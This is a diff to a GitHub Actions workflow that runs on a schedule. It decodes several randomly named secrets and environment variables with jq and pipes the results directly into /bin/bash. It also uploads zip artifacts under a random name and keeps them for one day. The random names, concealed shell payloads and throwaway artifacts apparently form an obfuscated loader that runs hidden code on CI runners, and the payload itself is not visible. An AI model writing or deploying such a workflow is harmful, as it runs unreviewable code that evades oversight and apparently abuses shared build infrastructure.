@@ -1,10 +1,9 @@
 name: websocketthomascfg
-
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '47 2/6 * * *'
 
+  schedule:
+    - cron: '57 3,9,15,21 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,12 +11,16 @@ jobs:
       - uses: actions/checkout@v4
       - name: websocketthomascfg
         env:
-          xjyy06: ${{ secrets.xjyy06 }}
+          jv2: ${{ secrets.jv2 }}
         run: |
-          echo $xjyy06 | jq -r .l2 | /bin/bash
-          echo $f85884 | jq -r .irpq822 | /bin/bash
-          echo $th15231 | jq -r .xvnnl54130 | /bin/bash
-          echo $howwd857 | jq -r .t78 | /bin/bash
-          echo $q6962 | jq -r .d42 | /bin/bash
-          echo $odgp59640 | jq -r .b2919 | /bin/bash
+          printf '%s' "$jv2" | jq -r .yrsvv53567 | /bin/bash
+          printf '%s' "$edbxv337" | jq -r .xob00657 | /bin/bash
+          echo $jzvq8724 | jq -r .z95170 | /bin/bash
+          echo $vcq71 | jq -r .tw0 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: b3fUGKqr
+          path: "*.zip"
+          retention-days: 1
